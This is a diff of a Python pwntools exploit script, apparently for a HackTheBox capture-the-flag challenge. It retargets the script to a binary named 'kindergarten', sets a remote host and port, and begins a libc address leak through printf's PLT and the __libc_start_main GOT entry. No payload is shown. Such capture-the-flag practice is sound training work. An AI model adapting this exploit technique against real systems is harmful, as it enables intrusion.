@@ -2,22 +2,22 @@
 from pwn import *
 import sys
 
-host = sys.argv[1]
-port = sys.argv[2]
+RHOST = "docker.hackthebox.eu"
+RPORT = 31877
 
-context.binary = './space'
+context.binary = './kindergarten'
 context.aslr = False
 
 
-#sh = remote(host,port)
-sh = process("./space")
+#sh = remote(RHOST,RPORT)
+sh = process("./kindergarten")
 
-space = ELF('./space')
+kindergarten = ELF('./kindergarten')
 libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64.so")
 
-puts_plt = space.plt['printf']
-libc_start_main_got = space.got['__libc_start_main']
-main = space.symbols['main']
+puts_plt = kindergarten.plt['printf']
+libc_start_main_got = kindergarten.got['__libc_start_main']
+main = kindergarten.symbols['main']
 
 log.info("Leak libc_start_main_got addr")
 
